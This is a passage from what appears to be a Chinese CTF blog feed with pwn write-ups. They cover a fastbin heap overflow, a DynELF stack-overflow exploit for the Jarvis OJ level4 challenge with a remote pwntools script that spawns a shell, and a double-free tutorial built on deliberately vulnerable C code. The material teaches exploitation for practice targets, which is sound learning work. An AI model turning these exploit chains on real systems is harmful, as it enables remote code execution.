0x0000000000000000</span><br><span class="line">0x6026c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026e0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>因为fastbin是单链表，所以我们free两次会得到一个单链表:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">Fastbin[1]-&gt;</span><span class="bash">0x602670-&gt;0x602690</span></span><br></pre></td></tr></table></figure>
<p>当我们再次申请相同大小的chunk的时候，作合适的写入操作就可以覆盖下一个chunk的内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br><span class="line">Continuing.</span><br><span class="line">1 2</span><br><span class="line">24 cccccccccccccccccccccccccccccccc</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> </span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx 0x602660-16</span></span><br><span class="line">0x602650:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602660:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x602670:	0x6363636363636363	0x6363636363636363</span><br><span class="line">0x602680:	0x6363636363636363	0x6363636363636363</span><br><span class="line">0x602690:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026a0:	0x0000000000000000	0x0000000000020961</span><br><span class="line">0x6026b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026e0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>我们需要注意的第一点是，我们free的顺序不能乱，一旦乱了，就会导致无法覆盖到理想的chunk处，要深入理解fastbin的LIFO机制，也就是想象成栈的机制，最好的理解方式就是自己多试几次，我们需要注意的第二点是我们不能一直乱覆盖到下一个chunk的size大小，因为size代表这个chunk的大小，要是乱覆盖用‘cccccccc’替代size内容那这个chunk的大小就变成了0x6363636363636363，就不是fastbin的大小了，也就无法达到目的了，所以我们必须选择好偏移的位置，将size大小正确写入下一个chunk，然后将chunk的fd指向我们的free函数地址，然后将’sh’写入free函数的地方。</p>
<p>exp:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./Overflow_Free_Chunk'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(i,s)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">	p.send(<span class="string">'1 %d\n24 %s'</span>%(i,s)+<span class="string">'\n'</span>)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(x)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">	p.send(<span class="string">'2 %d'</span>%x+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0</span>,<span class="string">'aaaaaaaa'</span>)</span><br><span class="line">malloc(<span class="number">1</span>,<span class="string">'bbbbbbbb'</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">malloc(<span class="number">2</span>,<span class="string">'a'</span>*<span class="number">24</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0x601018</span>)) <span class="comment"># free_hook</span></span><br><span class="line">malloc(<span class="number">3</span>,<span class="string">'sh'</span>) <span class="comment"># write 'sh' in ptr[3]</span></span><br><span class="line">malloc(<span class="number">4</span>, p64(<span class="number">0x4007d7</span>)) <span class="comment"># write in sh() address</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'2 3'</span>) <span class="comment"># free(3) ==&gt; system('sh')</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>题目篇</category>
        <category>PWN</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>Heap over flow</tag>
      </tags>
  </entry>
  <entry>
    <title>DynELF</title>
    <url>/2019/03/08/DynELF/</url>
    <content><![CDATA[<h1 id="0x00：前言"><a href="#0x00：前言" class="headerlink" title="0x00：前言"></a>0x00：前言</h1><p>DynELF方法适用于没有libc的情况，我们可以通过DynELF方法来实现泄露system函数的地址，那么DynELF是什么呢？在<a href="http://docs.pwntools.com/en/stable/dynelf.html?highlight=DynELF" target="_blank" rel="noopener">pwntools官方文档</a>有介绍，简单而言就是通过leak方法反复进入main函数中查询libc中的内容，其代码框架如下<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = process(<span class="string">'./xxx'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">  payload = <span class="string">"xxxxxxxx"</span> + address + <span class="string">"xxxxxxxx"</span></span><br><span class="line">  p.send(payload)</span><br><span class="line">  data = p.recv(<span class="number">4</span>)</span><br><span class="line">  log.debug(<span class="string">"%#x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))) <span class="comment">#打印搜索的信息</span></span><br><span class="line">  <span class="keyword">return</span> data</span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">"./xxx"</span>)) <span class="comment">#初始化DynELF模块</span></span><br><span class="line">systemAddress = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>) <span class="comment">#在libc文件中搜索system函数的地址</span></span><br></pre></td></tr></table></figure></p>
<p>我们通过一道题来深入了解这个方法</p>
<h1 id="0x01：Jarvis-Oj-level4"><a href="#0x01：Jarvis-Oj-level4" class="headerlink" title="0x01：Jarvis Oj-level4"></a>0x01：Jarvis Oj-level4</h1><h2 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h2><p> <a href="https://dn.jarvisoj.com/challengefiles/level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0" target="_blank" rel="noopener">https://dn.jarvisoj.com/challengefiles/level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0</a></p>
<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>  我们先检测一些保护机制<br>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">  root@Thunder_J-virtual-machine:~/桌面# checksec level4</span><br><span class="line">[*] '/home/Thunder_J/\xe6\xa1\x8c\xe9\x9d\xa2/level4'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled #堆栈不可执行</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure></p>
<p>用IDA查看一下主函数内容</p>
<h3 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h3><p>如果是做了前面level0-3的朋友应该对这里非常熟悉，逻辑非常简单，我们进vulnerable_function()函数内看一下<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Hello, World!\n"</span>, <span class="number">0xE</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="vulnerable-function"><a href="#vulnerable-function" class="headerlink" title="vulnerable_function()"></a>vulnerable_function()</h3><p>很明显这里出现栈溢出，read函数读取0x100的内容，双击buf可以看到buf只有0x88+0x4的大小，所以我们可以构造栈溢出<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="第一次构造"><a href="#第一次构造" class="headerlink" title="第一次构造"></a>第一次构造</h3><p>既然我们清楚是栈溢出，我们就需要多多观察程序内的信息，有没有system，’/bin/sh’等关键的内容，然而我们用IDA并没有搜索到有system或者’/bin/sh’的信息，那这里就需要用到上面提及的DynELF的方法了，我们通过objdump查看函数信息：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@Thunder_J-virtual-machine:~/桌面# objdump -R level4</span><br><span class="line"></span><br><span class="line">level4：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET   TYPE              VALUE </span><br><span class="line">08049ffc R_386_GLOB_DAT    __gmon_start__</span><br><span class="line">0804a00c R_386_JUMP_SLOT   read@GLIBC_2.0</span><br><span class="line">0804a010 R_386_JUMP_SLOT   __gmon_start__</span><br><span class="line">0804a014 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a018 R_386_JUMP_SLOT   write@GLIBC_2.0</span><br></pre></td></tr></table></figure></p>
<p>我们看到有read和write函数，其实有这两个函数就代表我们可以通过他们来泄露system函数在libc中的地址了，因为我们可以通过栈溢出覆盖返回地址执行，因此我们第一次构造调用write函数泄露libc中system的地址<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    write_plt = p32(<span class="number">0x08048340</span>)</span><br><span class="line">    fun_addr = p32(<span class="number">0x0804844b</span>)</span><br><span class="line">    payload = <span class="string">'a'</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>) + write_plt + fun_addr + p32(<span class="number">1</span>) + p32(addr) + p32(<span class="number">4</span>) <span class="comment">#write(1, addr, 4);</span></span><br><span class="line">    r.send(payload)</span><br><span class="line">    leaked = r.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> leaked</span><br><span class="line"> </span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">"./level4"</span>))</span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br></pre></td></tr></table></figure></p>
<h3 id="第二次构造"><a href="#第二次构造" class="headerlink" title="第二次构造"></a>第二次构造</h3><p>我们在得到了system函数的地址之后就需要写入’/bin/sh’字符串了，那么去哪里写入呢？当然是.bss段，我们通过readelf的方法查看程序的.bss段：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@Thunder_J-virtual-machine:~/桌面# readelf -S level4</span><br><span class="line">There are 30 section headers, starting at offset 0x1844:</span><br><span class="line"></span><br><span class="line">节头：</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 000020 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          080481cc 0001cc 000060 10   A  6   1  4</span><br><span class="line">  [ 6] .dynstr           STRTAB          0804822c 00022c 000050 00   A  0   0  1</span><br><span class="line">  [ 7] .gnu.version      VERSYM          0804827c 00027c 00000c 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         08048288 000288 000020 00   A  6   1  4</span><br><span class="line">  [ 9] .rel.dyn          REL             080482a8 0002a8 000008 08   A  5   0  4</span><br><span class="line">  [10] .rel.plt          REL             080482b0 0002b0 000020 08  AI  5  12  4</span><br><span class="line">  [11] .init             PROGBITS        080482d0 0002d0 000023 00  AX  0   0  4</span><br><span class="line">  [12] .plt              PROGBITS        08048300 000300 000050 04  AX  0   0 16</span><br><span class="line">  [13] .text             PROGBITS        08048350 000350 0001c2 00  AX  0   0 16</span><br><span class="line">  [14] .fini             PROGBITS        08048514 000514 000014 00  AX  0   0  4</span><br><span class="line">  [15] .rodata           PROGBITS        08048528 000528 000017 00   A  0   0  4</span><br><span class="line">  [16] .eh_frame_hdr     PROGBITS        08048540 000540 000034 00   A  0   0  4</span><br><span class="line">  [17] .eh_frame         PROGBITS        08048574 000574 0000ec 00   A  0   0  4</span><br><span class="line">  [18] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4</span><br><span class="line">  [19] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4</span><br><span class="line">  [20] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4</span><br><span class="line">  [21] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4</span><br><span class="line">  [22] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4</span><br><span class="line">  [23] .got.plt          PROGBITS        0804a000 001000 00001c 04  WA  0   0  4</span><br><span class="line">  [24] .data             PROGBITS        0804a01c 00101c 000008 00  WA  0   0  4</span><br><span class="line">  [25] .bss              NOBITS          0804a024 001024 000004 00  WA  0   0  1</span><br><span class="line">  [26] .comment          PROGBITS        00000000 001024 000052 01  MS  0   0  1</span><br><span class="line">  [27] .shstrtab         STRTAB          00000000 001076 000106 00      0   0  1</span><br><span class="line">  [28] .symtab           SYMTAB          00000000 00117c 000450 10     29  45  4</span><br><span class="line">  [29] .strtab           STRTAB          00000000 0015cc 000276 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  p (processor specific)</span><br></pre></td></tr></table></figure></p>
<p>根据上面的数据我们选中.bss段的地址开始第二次构造，在.bss段中写入’/bin/sh’字符串<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data_addr = <span class="number">0x0804A024</span> <span class="comment"># readelf -S level4</span></span><br><span class="line"></span><br><span class="line">read_plt = p32(<span class="number">0x08048310</span>)</span><br><span class="line">fun_addr = p32(<span class="number">0x0804844b</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>) + read_plt + fun_addr + p32(<span class="number">0</span>) + p32(data_addr) + p32(<span class="number">8</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">"/bin/sh\x00"</span>)</span><br></pre></td></tr></table></figure></p>
<h3 id="第三次构造"><a href="#第三次构造" class="headerlink" title="第三次构造"></a>第三次构造</h3><p>准备工作做完了当然最后一步就是getshell了<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>) + p32(system_addr) + <span class="string">'aaaa'</span> + p32(data_addr)</span><br><span class="line">r.send(payload)</span><br></pre></td></tr></table></figure></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>总结一下上面的步骤<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">r = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9880</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    write_plt = p32(<span class="number">0x08048340</span>)</span><br><span class="line">    fun_addr = p32(<span class="number">0x0804844b</span>)</span><br><span class="line">    buf = p32(addr)</span><br><span class="line">    payload = <span class="string">'a'</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>) + write_plt + fun_addr + p32(<span class="number">1</span>) + buf + p32(<span class="number">4</span>)</span><br><span class="line">    r.send(payload)</span><br><span class="line">    leaked = r.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> leaked</span><br><span class="line"> </span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">"./level4"</span>))</span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line"> </span><br><span class="line">data_addr = <span class="number">0x0804A024</span> <span class="comment"># readelf -S level4</span></span><br><span class="line"></span><br><span class="line">read_plt = p32(<span class="number">0x08048310</span>)</span><br><span class="line">fun_addr = p32(<span class="number">0x0804844b</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>) + read_plt + fun_addr + p32(<span class="number">0</span>) + p32(data_addr) + p32(<span class="number">8</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>) + p32(system_addr) + <span class="string">'aaaa'</span> + p32(data_addr)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p>
<h1 id="0x02：总结"><a href="#0x02：总结" class="headerlink" title="0x02：总结"></a>0x02：总结</h1><p>没有做过level0-3的建议做一下在做level4，每个题目收获都会有所不同<br>参考链接：<br><a href="https://www.anquanke.com/post/id/85129" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85129</a><br><a href="https://blog.csdn.net/smalosnail/article/details/53386353" target="_blank" rel="noopener">https://blog.csdn.net/smalosnail/article/details/53386353</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>题目篇</category>
        <category>PWN</category>
        <category>栈</category>
      </categories>
      <tags>
        <tag>DynELF</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastbin Double Free</title>
    <url>/2019/03/07/Fastbin-Double-Free/</url>
    <content><![CDATA[<h1 id="0x00：前言"><a href="#0x00：前言" class="headerlink" title="0x00：前言"></a>0x00：前言</h1><p>这次分析一种题型叫做Double Free，字面意思就是两次释放，那么下面就通过两个例子详细讲一下什么是Double Free。</p>
<h1 id="0x01：漏洞介绍"><a href="#0x01：漏洞介绍" class="headerlink" title="0x01：漏洞介绍"></a>0x01：漏洞介绍</h1><p>Fastbin Double Free 是指 fastbin 的 chunk 可以被多次释放，因此可以在 fastbin 链表中存在多次。这样导致的后果是多次分配可以从 fastbin 链表中取出同一个堆块，相当于多个指针指向同一个堆块，结合堆块的数据内容可以实现类似于类型混淆 (type confused) 的效果。</p>
<p>Fastbin Double Free 能够成功利用主要有两部分的原因</p>
<ul>
<li>fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空</li>
<li>fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</li>
</ul>
<p>更详细的介绍<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack/#fastbin-double-free" target="_blank" rel="noopener">CTF-wiki</a>上有，我就不赘述了。下面直接来实例：</p>
<h1 id="0x02：例子"><a href="#0x02：例子" class="headerlink" title="0x02：例子"></a>0x02：例子</h1><h2 id="Example-One"><a href="#Example-One" class="headerlink" title="Example One"></a>Example One</h2><p>首先创建一个heap.c，内容如下<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sh</span><span class="params">(<span class="keyword">char</span> *id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(id);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">int</span> cmd,idx,sz;</span><br><span class="line">	<span class="keyword">char</span> *ptr[<span class="number">10</span>];</span><br><span class="line">	<span class="built_in">memset</span>(ptr,<span class="number">0</span>,<span class="keyword">sizeof</span>(ptr));</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"1.malloc+gets\n2.free\n3.puts\n"</span>);</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;cmd,&amp;idx); <span class="comment">//这里cmd是选择功能，idx是为了区分申请的第几个chunk</span></span><br><span class="line">		idx %= <span class="number">10</span>;</span><br><span class="line">		<span class="keyword">if</span>(cmd==<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">"%d%*c"</span>,&amp;sz);</span><br><span class="line">			ptr[idx] = <span class="built_in">malloc</span>(sz);</span><br><span class="line">			gets(ptr[idx]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(cmd==<span class="number">2</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">free</span>(ptr[idx]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(cmd==<span class="number">3</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">puts</span>(ptr[idx]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"> 	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>编译：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -no-pie heap.c -o heap -g -w</span><br></pre></td></tr></table></figure></p>
<p>这道题有三个选项，一个申请，一个释放，一个打印，因为可以自己操作释放，我们分析之后发现存在Double Free的漏洞，下面就直接动态演示一下这个过程，我们断在输入的地方<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> b 20</span></span><br><span class="line">Breakpoint 1 at 0x40085b: file heap.c, line 20.</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> r</span></span><br><span class="line">Starting program: /home/Thunder_J/桌面/heap </span><br><span class="line">1.malloc+gets</span><br><span class="line">2.free</span><br><span class="line">3.puts</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> </span></span><br><span class="line">Breakpoint 1, main () at heap.c:20</span><br><span class="line">20			scanf("%d %d",&amp;cmd,&amp;idx); //这里cmd是选择功能，idx是为了区分申请的第几个chunk</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> RAX  0x2</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x0</span><br><span class="line"> RDX  0x7ffff7dd18c0 (_IO_stdfile_1_lock) ◂— 0x0</span><br><span class="line"> RDI  0x1</span><br><span class="line"> RSI  0x7fffffffb8e0 ◂— 0x203e /* '&gt; ' */</span><br><span class="line"> R8   0x2</span><br><span class="line"> R9   0x7ffff7fda4c0 ◂— 0x7ffff7fda4c0</span><br><span class="line"> R10  0x3</span><br><span class="line"> R11  0x246</span><br><span class="line"> R12  0x4006f0 (_start) ◂— xor    ebp, ebp</span><br><span class="line"> R13  0x7fffffffe0e0 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x7fffffffe000 —▸ 0x400940 (__libc_csu_init) ◂— push   r15</span><br><span class="line"> RSP  0x7fffffffdf80 ◂— 0x0</span><br><span class="line"> RIP  0x40085b (main+105) ◂— lea    rdx, [rbp - 0x78]</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line"> ► 0x40085b &lt;main+105&gt;    lea    rdx, [rbp - 0x78] &lt;0x7ffff7dd18c0&gt;</span><br><span class="line">   0x40085f &lt;main+109&gt;    lea    rax, [rbp - 0x7c]</span><br><span class="line">   0x400863 &lt;main+113&gt;    mov    rsi, rax</span><br><span class="line">   0x400866 &lt;main+116&gt;    lea    rdi, [rip + 0x177]</span><br><span class="line">   0x40086d &lt;main+123&gt;    mov    eax, 0</span><br><span class="line">   0x400872 &lt;main+128&gt;    call   __isoc99_scanf@plt &lt;0x4006d0&gt;</span><br><span class="line"> </span><br><span class="line">   0x400877 &lt;main+133&gt;    mov    ecx, dword ptr [rbp - 0x78]</span><br><span class="line">   0x40087a &lt;main+136&gt;    mov    edx, 0x66666667</span><br><span class="line">   0x40087f &lt;main+141&gt;    mov    eax, ecx</span><br><span class="line">   0x400881 &lt;main+143&gt;    imul   edx</span><br><span class="line">   0x400883 &lt;main+145&gt;    sar    edx, 2</span><br><span class="line">───────────────────────────────[ SOURCE (CODE) ]────────────────────────────────</span><br><span class="line">In file: /home/xsj/桌面/heap.c</span><br><span class="line">   15 	memset(ptr,0,sizeof(ptr));</span><br><span class="line">   16 	puts("1.malloc+gets\n2.free\n3.puts\n");</span><br><span class="line">   17 	while(1)</span><br><span class="line">   18 	&#123;</span><br><span class="line">   19 		printf("&gt; ");</span><br><span class="line"> ► 20 		scanf("%d %d",&amp;cmd,&amp;idx); //这里cmd是选择功能，idx是为了区分申请的第几个chunk</span><br><span class="line">   21 		idx %= 10;</span><br><span class="line">   22 		if(cmd==1)</span><br><span class="line">   23 		&#123;</span><br><span class="line">   24 			scanf("%d%*c",&amp;sz);</span><br><span class="line">   25 			ptr[idx] = malloc(sz);</span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7fffffffdf80 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f 0           40085b main+105</span><br><span class="line">   f 1     7ffff7a05b97 __libc_start_main+231</span><br><span class="line">Breakpoint /home/Thunder_J/桌面/heap.c:20</span><br></pre></td></tr></table></figure></p>
<p>我们按如下方式先申请两块大小为25的内存：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> n</span></span><br><span class="line">1 0</span><br><span class="line">...</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br><span class="line">Continuing.</span><br><span class="line">25 aaaaaaaa</span><br><span class="line">...</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br><span class="line">Continuing.</span><br><span class="line">1 1</span><br><span class="line">25 bbbbbbbb</span><br><span class="line">...</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> heap <span class="comment">#find heap</span></span></span><br><span class="line">...</span><br><span class="line">0x602660 FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = 0, </span><br><span class="line">  mchunk_size = 49, </span><br><span class="line">  fd = 0x6161616161616161, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x602690 FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = 0, </span><br><span class="line">  mchunk_size = 49, </span><br><span class="line">  fd = 0x6262626262626262, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx 0x602670-16</span></span><br><span class="line">0x602660:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x602670:	0x6161616161616161	0x0000000000000000	#'aaaaaaaa'</span><br><span class="line">0x602680:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602690:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x6026a0:	0x6262626262626262	0x0000000000000000  #'bbbbbbbb'</span><br><span class="line">0x6026b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026c0:	0x0000000000000000	0x0000000000020941</span><br><span class="line">0x6026d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026f0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure></p>
